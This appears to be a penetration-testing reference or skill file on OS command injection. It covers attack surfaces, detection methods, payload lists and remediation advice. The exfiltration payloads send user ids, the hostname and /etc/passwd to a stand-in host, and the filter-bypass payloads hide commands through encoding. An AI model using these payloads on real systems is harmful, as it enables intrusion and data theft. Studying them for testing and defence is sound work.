---
name: cmdi
description: OS Command Injection detection and exploitation techniques
---

# Command Injection (CMDi)

## Attack Surface

- Parameters passed to system commands (ping, nslookup, file conversion)
- File upload with crafted filenames processed by shell commands
- PDF generators, image processors (ImageMagick), archive extractors
- CI/CD pipelines processing user-supplied build configurations
- Network diagnostic tools exposed via web interfaces
- Cron job or scheduled task inputs

## Detection Techniques

- Inject time-delay payloads: `; sleep 5`, `| timeout /t 5`
- Use out-of-band detection: DNS lookup via `nslookup`, `curl` to collaborator
- Test command separators: `;`, `|`, `||`, `&&`, `\n`, backticks
- Check for partial reflection of command output in responses
- Fuzz filenames with shell metacharacters during upload
- Identify technology stack to target OS-specific separators

## Common Payloads

### Detection (Linux)
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& sleep 5 &
|| sleep 5
; ping -c 5 127.0.0.1
```

### Detection (Windows)
```
& timeout /t 5
| timeout /t 5
; ping -n 5 127.0.0.1
%0a ping -n 5 127.0.0.1
```

### Data Exfiltration
```
; curl http://attacker.com/$(whoami)
; nslookup $(cat /etc/hostname).attacker.com
| wget http://attacker.com/$(id | base64)
$(cat /etc/passwd | base64 | curl -d @- http://attacker.com)
```

### Filter Bypass
```
;{sleep,5}
;$'\x73\x6c\x65\x65\x70' 5
;sl""eep 5
;s${IFS}l${IFS}e${IFS}e${IFS}p${IFS}5
;$(echo c2xlZXAgNQ== | base64 -d)
```

## Remediation

- Avoid calling OS commands from application code; use native libraries instead
- If shell execution is unavoidable, use parameterized APIs (e.g., `subprocess.run(["cmd", arg])` without `shell=True`)
- Allowlist validate input characters (alphanumeric only where possible)
- Strip or reject shell metacharacters: `` ; | & ` $ ( ) { } \n ``
- Run application processes in sandboxed environments with minimal privileges
- Monitor and alert on unexpected child process creation

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
